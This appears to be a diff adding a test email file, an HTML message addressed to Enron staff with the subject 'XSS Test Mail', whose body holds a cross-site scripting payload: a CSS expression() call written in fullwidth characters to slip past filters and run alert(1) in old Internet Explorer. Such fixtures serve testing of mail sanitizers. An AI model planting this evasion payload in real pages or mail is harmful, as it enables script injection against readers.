@@ -1,0 +1,7 @@
+From: "Training Manager" <it-training@find-computer-training.net>
+To: jeff.skilling@enron.com, steven.kean@enron.com, james.steffes@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<div style="x:ｅｘｐｒｅｓｓｉｏｎ(alert(1))">IE6</div>
